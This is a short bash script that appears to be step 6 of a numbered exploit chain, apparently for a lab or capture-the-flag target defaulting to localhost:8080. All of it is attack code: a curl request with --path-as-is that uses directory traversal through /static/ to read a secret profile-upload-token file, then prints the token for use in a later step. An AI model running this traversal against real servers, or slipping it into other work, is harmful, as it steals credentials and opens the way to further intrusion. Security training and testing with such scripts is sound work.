#!/usr/bin/env bash
# Step 6: Read profile-upload-token via directory traversal
# Usage: TARGET=<host:port> ./03-traversal-token.sh
TARGET="${TARGET:-localhost:8080}"

echo "=== [Step 6] Read profile-upload-token ==="
TOKEN=$(curl -s --path-as-is "http://${TARGET}/static/x/../../secrets/profile-upload-token")
echo "Token: ${TOKEN}"
echo ""
echo "[*] Save this token for step 04."
